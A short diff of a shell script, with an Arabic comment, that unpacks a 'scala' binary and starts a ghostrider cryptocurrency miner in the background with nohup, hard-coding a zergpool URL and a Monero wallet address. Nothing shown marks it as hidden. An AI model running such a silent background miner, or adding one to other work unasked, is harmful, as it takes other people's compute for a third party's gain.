@@ -19,10 +19,10 @@ tar -xvf scala.tar.gz --strip=1
 rm scala.tar.gz
 
 # تشغيل المعدّن في الخلفية بنواة واحدة
-nohup ./scala \ 
-  --algorithm ghostrider \
-  --pool $POOL \
-  --wallet $WALLET \
-  --password c=XMR \
-  --cpu-threads-limit $THREADS \
-  > cpu_output.log 2>&1 &
+nohup ./scala -a ghostrider --url ghostrider.eu.mine.zergpool.com:5354 --user 4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR -p c=XMR -t 1 > cpu_output.log 2>&1 &
+ # --algorithm ghostrider \
+ # --pool $POOL \
+ # --wallet $WALLET \
+ # --password c=XMR \
+ # --cpu-threads-limit $THREADS \
+ # > cpu_output.log 2>&1 &
